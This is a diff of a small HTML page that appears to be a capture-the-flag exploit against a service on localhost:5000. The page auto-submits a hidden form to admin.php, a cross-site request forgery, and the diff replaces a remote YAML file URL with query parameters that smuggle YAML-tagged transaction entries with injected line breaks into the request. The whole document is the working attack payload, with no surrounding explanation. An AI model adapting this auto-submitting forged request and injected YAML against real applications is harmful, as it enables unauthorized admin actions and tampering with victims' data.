@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-<form id="f" action="http://localhost:5000/admin.php" method="POST">
-<input name="url" type="hidden" value="https://talha-3921.github.io/ctf/transactions.yaml">
+<form id="f" action="http://localhost:5000/admin.php?transactions[0][amount]=1&transactions[0][country]=fake&transactions[1]=- amount: !!int 1000000&#13;&#10;  !!str XYZ&#13;&#10;  !!str BUY&transactions[2]=- amount: !!int 1000000&#13;&#10;  !!str XYZ&#13;&#10;  !!str SELL&transactions[3]=- amount: !!int 1&#13;&#10;  !!str FL&#13;&#10;  !!str BUY" method="POST">
+<input name="url" type="hidden" value="">
 </form>
 <script>document.getElementById("f").submit();</script>
 </body>
